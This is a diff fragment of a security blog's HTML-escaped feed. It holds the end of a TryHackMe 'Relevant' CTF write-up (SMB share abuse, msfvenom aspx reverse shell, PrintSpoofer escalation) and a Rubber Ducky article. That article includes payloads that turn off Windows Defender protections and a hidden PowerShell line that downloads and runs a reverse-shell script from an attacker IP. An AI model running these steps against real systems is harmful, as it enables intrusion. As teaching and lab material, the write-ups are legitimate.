+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2022&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;07&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;start_date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2022&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;07&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;smb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;discovery&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; 
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;OS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Windows&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Server&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2016&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Standard&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Evaluation&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;14393&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Windows&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Server&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2016&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Standard&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Evaluation&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;6.3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;Computer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Relevant&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;NetBIOS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;computer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RELEVANT&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;x00&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;Workgroup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;WORKGROUP&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;x00&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2022&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;07&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;56&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;07&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;Service&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;detection&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;performed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Please&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;report&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;any&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;incorrect&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;results&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;at&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nmap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;org&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Nmap done at Tue Jul 12 16:19:37 2022 -- 1 IP address (1 host up) scanned in 112.09 seconds
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;
+
+&lt;p&gt;So if we access the website on the port 80 we can see that is the default page of IIS, so anything interestting here at the moment.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-relevant/captura2.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Using &lt;strong&gt;&lt;em&gt;smbclient&lt;/em&gt;&lt;/strong&gt; if we list smb shares using a null session with the flag &lt;strong&gt;&lt;em&gt;-N&lt;/em&gt;&lt;/strong&gt; we can see that there is a following share called &lt;strong&gt;&lt;em&gt;nt4wrksv&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-relevant/captura3.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;If we access on that share we can see that there is the following text file, so let’s download it on our attacker machine using the command &lt;strong&gt;&lt;em&gt;get&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-relevant/captura4.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And we can see that there is a passwords encoded in base64.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-relevant/captura5.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;So if we decode it we can see that there is a two users with the following passwords.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-relevant/captura6.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Using &lt;strong&gt;&lt;em&gt;psexec&lt;/em&gt;&lt;/strong&gt; we can see that we can not access with the target machine using these credentials.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-relevant/captura7.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;If try to validate those credentials using &lt;strong&gt;&lt;em&gt;crackmapexec&lt;/em&gt;&lt;/strong&gt; it will not output anything, so that’s mean that the user doesn’t exits or the password is incorrect.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-relevant/captura8.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;So if we try to fuzz on the port 49663 webserver we can find a subdirectory that is named the same as the SMB share as we saw before, which is &lt;strong&gt;&lt;em&gt;nt4wrksv&lt;/em&gt;&lt;/strong&gt;. In this case the fuzzing process to find directories on the webserver it can long time, so thats why i don’t use it fuzzing tools only i check manually if that path exists or not.&lt;/p&gt;
+
+&lt;p&gt;We can check to see if that share is linked to the webserver by trying to access the &lt;strong&gt;&lt;em&gt;passwords.txt&lt;/em&gt;&lt;/strong&gt; file that we saw before and we can see that we can view the content of that file, thats mean that this share is linked to the webserver on the port 49663.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-relevant/captura9.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;
+
+&lt;p&gt;In this case we have read and write permissions to the web directory that is linked through the SMB share, we can test this by transfering a file on that share. Knowing that we can create a payload with &lt;strong&gt;&lt;em&gt;msfvenom&lt;/em&gt;&lt;/strong&gt; to get a reverse shell on the target machine, note that IIS generally requires an &lt;strong&gt;&lt;em&gt;aspx&lt;/em&gt;&lt;/strong&gt; shell and that’s mean that we need to specify this file type with the flag &lt;strong&gt;&lt;em&gt;-f&lt;/em&gt;&lt;/strong&gt;, the payload is need to be in x64 architecture because we saw previously the version of windows that is using the target machine.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-relevant/captura10.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Once generated the payload let’s transfer to the SMB share that is linked to the webserver using smbclient again.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-relevant/captura11.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Start a netcat listener on the port that we specify in msfvenom and access on that malicious payload that we generated on the webserver and we will see that it is loading the file.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-relevant/captura12.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Now if we go back on our netcat listener we can see that we have access to the machine.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-relevant/captura13.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;We can see that there is a user called &lt;strong&gt;&lt;em&gt;bob&lt;/em&gt;&lt;/strong&gt; on the system as we saw before.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-relevant/captura14.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And if we try to access on the desktop folder of that user we can view the first flag which is &lt;strong&gt;&lt;em&gt;user.txt&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-relevant/captura15.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;privesc&quot;&gt;PrivESC&lt;/h2&gt;
+
+&lt;p&gt;If we execute the command &lt;strong&gt;&lt;em&gt;whoami /priv&lt;/em&gt;&lt;/strong&gt; to check the privileges that we have with this current user we can that the &lt;strong&gt;&lt;em&gt;SeImpersonatePrivilege&lt;/em&gt;&lt;/strong&gt; is enabled (in the following &lt;a href=&quot;https://bynafrez08.github.io/thm-alfred/#&quot;&gt;article&lt;/a&gt; i explain in detail how to exploit this privileges).&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-relevant/captura16.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;In this case we are going to use the binary &lt;a href=&quot;https://github.com/itm4n/PrintSpoofer&quot;&gt;PrintSpoofer&lt;/a&gt; to exploit this privilege, once we download the binary let’s transfer on the targer machine.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-relevant/captura17.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Now we are going to execute the binary with the flag &lt;strong&gt;&lt;em&gt;-i&lt;/em&gt;&lt;/strong&gt; to interact with the new process and &lt;strong&gt;&lt;em&gt;-c&lt;/em&gt;&lt;/strong&gt; to execute a command, in this case we are going to execute a command prompt (cmd). And as you can see it’s take advantage of the &lt;strong&gt;&lt;em&gt;SeimpersonatePrivilege&lt;/em&gt;&lt;/strong&gt; to access as admin users.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-relevant/captura18.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Now if we move on the admin user desktop directory we can view the last flag which is &lt;strong&gt;&lt;em&gt;root.txt&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-relevant/captura19.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;This is one of the machines that i recommend to do if you are starting doing ctf’s, because it’s a easy machine and it’s cover some basics exploitations on windows systems.&lt;/p&gt;</content><author><name>Nafsu Uddin | AKA bynafrez</name></author><category term="Tryhackme" /><category term="Windows" /><category term="CVE" /><summary type="html">Relevant is a windows machine that has enabled smb which will going to exploit this services to access on the machine, and for the privilege escalation we are going to exploit windows access tokens.</summary></entry><entry><title type="html">THM - Retro</title><link href="http://localhost:4000/thm-retro/" rel="alternate" type="text/html" title="THM - Retro" /><published>2022-08-08T00:00:00-04:00</published><updated>2022-08-08T00:00:00-04:00</updated><id>http://localhost:4000/thm-retro</id><content type="html" xml:base="http://localhost:4000/thm-retro/">&lt;p&gt;Retro is a windows machine with wordpress site hosted on the port 80, which contain some credentials that allow access on the admin panel and get a reverse shell on the target machine, and lastly we escalete privileges abusing the CVE-2019-1388.&lt;/p&gt;
 
 &lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/img-retro/retro.jpeg&quot; /&gt;
@@ -3674,191 +3905,4 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 &lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/img-logforge/captura60.png&quot; /&gt;
-&lt;/p&gt;</content><author><name>Nafsu Uddin | AKA bynafrez</name></author><category term="Hack the box" /><category term="Linux" /><category term="CVE" /><category term="RCE" /><summary type="html">LogForge is a linux machine with a medium level of difficulty both in the exploitation phase and the privileges escalation, in this machine we take advantage of the vulnerability of the apache tomcat service to have access to the manager panel and we will also be exploiting a very critical vulnerability that has just been released recently which is the log4shell.</summary></entry><entry><title type="html">Hak5 - Rubber Ducky</title><link href="http://localhost:4000/hak5-rubberducky/" rel="alternate" type="text/html" title="Hak5 - Rubber Ducky" /><published>2022-01-11T00:00:00-05:00</published><updated>2022-01-11T00:00:00-05:00</updated><id>http://localhost:4000/hak5-rubberducky</id><content type="html" xml:base="http://localhost:4000/hak5-rubberducky/">&lt;p&gt;Rubber ducky by hak5 is a usb that simulates a keyboard that as soon as it is connected to a computer starts to write or perform the payload that we have indicated in a super fast way, in this article we will create some payloads and attacks that we can done and how to mitigate these types of attacks.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/portada1.jpg&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;Here we can see the parts that make the rubber ducky and the tools we need that are already included in the package we bought, which in this case is the micro-SD card, sd to usb adapter (to put our payloads on the micro-sd card to our pc) and the usb to mini usb adapter if we want to connect the rubber ducky to an andriod phone or tablet.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/foto.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;Now what we need is an encoder for our rubber ducky payloads, in my case I’m going to use the shell to encode my payloads which you can download from my &lt;a href=&quot;https://github.com/nafsuuddini08/USB-Rubber-Ducky&quot;&gt;repo&lt;/a&gt;, but there are websites that allow us to do this like &lt;a href=&quot;https://ducktoolkit.com/encode&quot;&gt;Ducktoolkit&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura1.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;In the hak5 repo we have a lot of payloads that we can use, but in this case we are going to make our own payloads.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura2.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;In the case if we want to encode our payloads on the terminal (which is my case) we will clone the repo that i mentioned above.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura3.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;h2 id=&quot;my-first-ducky-payload&quot;&gt;My first ducky payload&lt;/h2&gt;
-
-&lt;p&gt;To start i am going to create a payload that opens the notepad that says “hello world”. if you want to copy the payloads that i have created remember that you have it in my github repo that i mentiones before. After doing some research to know how rubber ducky payloads works i realized that the syntax is very simple, since we have to understand that the rubber ducky is act like a keyboard. And always we ara going to use the following commands:&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;&lt;em&gt;Delay&lt;/em&gt;&lt;/strong&gt;: Pause for each seconds or milliseconds.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;&lt;em&gt;GUI r&lt;/em&gt;&lt;/strong&gt;: Win + r key (GUI for interface).&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;&lt;em&gt;STRING&lt;/em&gt;&lt;/strong&gt;: To write a text.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;&lt;em&gt;ENTER&lt;/em&gt;&lt;/strong&gt; : To press the ↲ key.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura4.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;And now to encode our payload we must use the following command that it’s shown in the image, and this command will create a file called &lt;strong&gt;&lt;em&gt;inject.bin&lt;/em&gt;&lt;/strong&gt; that we will have to move it in the micro-SD card.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura5.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;I move the &lt;strong&gt;&lt;em&gt;inject.bin&lt;/em&gt;&lt;/strong&gt; file on the micro-SD card that in my case it is the f:/ drive, and it’s very important that the micro-SD card only has this file inside because otherwise our payload will not work.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura6.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;And once moved the file we will disconnect the micro-SD card and insert it into the sd slot of the rubber ducky. And now let’s test our payload.&lt;/p&gt;
-
-&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/H1HflNU3o5U&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
-
-&lt;h2 id=&quot;rick-roll&quot;&gt;Rick Roll&lt;/h2&gt;
-
-&lt;p&gt;Now let’s try to create another payload that our rubber ducky will play a youtube video and with the command &lt;strong&gt;&lt;em&gt;STRING f&lt;/em&gt;&lt;/strong&gt; press the f key to show the video in full screen.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura7.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;We are going to encode the payload as we have done previously.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura8.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;And we are going to move the &lt;strong&gt;&lt;em&gt;inject.bin&lt;/em&gt;&lt;/strong&gt; in the sd card as we have done previously.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura9.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;When i run the payload with the rubber ducky it’s popup me an error and this is because my keyboard is spanish and not in english because the &lt;strong&gt;&lt;em&gt;duckencoder.jar&lt;/em&gt;&lt;/strong&gt; accepts english keyboard.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura10.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;So i decided to encode and download the payload in ducktoolkit that let’s us select the language that is on the keyboard, that in my case is in spanish.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura11.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;And now let’s test the payload if it works this time.&lt;/p&gt;
-
-&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/opPi95ocsJs&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
-
-&lt;h2 id=&quot;disable-windows-defender-firewall&quot;&gt;Disable windows defender firewall&lt;/h2&gt;
-
-&lt;p&gt;To start what i will do is to create a payload that will disable the windows defender firewall, the first thing will be execute the powershell as administrator because if we want to disable the firewall in powershell we need admin privileges to do that, and then we will execute the command &lt;strong&gt;&lt;em&gt;netsh&lt;/em&gt;&lt;/strong&gt; to disable the firewall.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;&lt;em&gt;LEFT ENTER&lt;/em&gt;&lt;/strong&gt;: Basically what i am indicating here is when the popup appears to execute the powershell as administrator that hit enter in “yes” option which the boton is on the left.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura12.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;Ok so we do all the process that we have done before when we encode the payloads and the sd card we are gon a put in the rubber ducky, And let’s see if the payload works.&lt;/p&gt;
-
-&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/Ta4lYag7DTw&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
-
-&lt;p&gt;In the payload i forgot to indicate to close the powershell windows, but i leave that for you to do that on your own.&lt;/p&gt;
-
-&lt;h2 id=&quot;reverse-shell&quot;&gt;Reverse Shell&lt;/h2&gt;
-
-&lt;p&gt;Ok now we are going to perform one of the most interesting attacks that an attackers can use, which is reverse shell. In this case i have created the following payload:&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura13.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;The first thing i do to start create the payload it’s to disable the real-time protection on windows to avoid problems when we are gon a perform the reverse shell. I tried to look if there are commands to disable that option but i couldn’t find anything, so i had no alternative to indicate that to do it manually.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura14.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;In my case i am going to use the followong powershell script to execute the reverse shell on the client side that i found in the &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell&quot;&gt;payload all the things&lt;/a&gt; repo.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura15.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;This is the second part of the payload we are going to use the following command to receive the shell from the victim machine in our attacker machine, This command is very simple what it does is download and execute the &lt;strong&gt;&lt;em&gt;ps1&lt;/em&gt;&lt;/strong&gt; on the victim machine, that this &lt;strong&gt;&lt;em&gt;ps1&lt;/em&gt;&lt;/strong&gt; file is gon a be hosted on our attacker machine with python or php. And in this case i use &lt;strong&gt;&lt;em&gt;hidden&lt;/em&gt;&lt;/strong&gt; so it doesn’t show that command is running.&lt;/p&gt;
-
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;powershell&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hidden&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;IEX (New-Object Net.WebClient).DownloadString('http://192.168.118.131/payload.ps1');
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;And now in our attacker’s machine we are going to create a temporal http server with python in one window to host our &lt;strong&gt;&lt;em&gt;ps1&lt;/em&gt;&lt;/strong&gt; script so that we can download in the victim machine, and on the other window we are going to be listening to receive the connection with netcat.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura16.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;And we are going to encode our payload as we have done before. And now let’s try our payload.&lt;/p&gt;
-
-&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/KhiJT_hwyAA&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
-
-&lt;h2 id=&quot;reverse-shell-2-with-msfvenom&quot;&gt;Reverse Shell 2 with msfvenom&lt;/h2&gt;
-
-&lt;p&gt;We have another option to make a reverse shell although i personally prefer the first one, but if you want you can do it this way. So the first thing we are going to do is create a windows reverse shell tcp payload with the &lt;strong&gt;&lt;em&gt;.exe&lt;/em&gt;&lt;/strong&gt; binary with &lt;strong&gt;&lt;em&gt;msfvenom&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura17.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;This payload it is a bit long that it consists of three parts, the first is to disable the real time protection, the second is to execute with the command &lt;strong&gt;&lt;em&gt;certutil.exe&lt;/em&gt;&lt;/strong&gt; that comes by default on windows is to download the binary &lt;strong&gt;&lt;em&gt;revs.exe&lt;/em&gt;&lt;/strong&gt; (that i recommend that you download it in the temp directory) that will be hosted and the last part is using the command &lt;strong&gt;&lt;em&gt;Start-Process&lt;/em&gt;&lt;/strong&gt; to execute the &lt;strong&gt;&lt;em&gt;revs.exe&lt;/em&gt;&lt;/strong&gt; that will return the shell of the victim machine to our attacker machine.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura18.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;And finally, as we have done previously, it is with python or php to create a temporal http server to download the &lt;strong&gt;&lt;em&gt;revs.exe&lt;/em&gt;&lt;/strong&gt; in the victim machine and in the second window is to listen with netcat.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura19.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;We are going to encode the payload bla bla bla as we have done priviously. Now let’s try our payload!!!.&lt;/p&gt;
-
